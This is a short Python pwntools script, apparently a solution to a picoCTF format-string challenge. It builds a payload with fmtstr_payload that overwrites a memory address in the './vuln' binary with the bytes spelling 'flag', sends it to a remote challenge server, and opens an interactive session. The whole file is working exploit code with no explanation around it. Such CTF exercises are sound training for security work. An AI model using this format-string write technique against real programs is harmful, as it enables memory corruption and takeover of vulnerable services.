from pwn import *

context.binary = ELF('./vuln')
# p = process('./vuln')

SUS_ADDR = 0x00404060
WIN_VAL = 0x67616c66
writes = {SUS_ADDR: WIN_VAL}

payload = fmtstr_payload(14, writes, numbwritten=0)
log.info(payload)

p = remote('rhea.picoctf.net', 54604)
p.sendline(payload)
p.interactive()
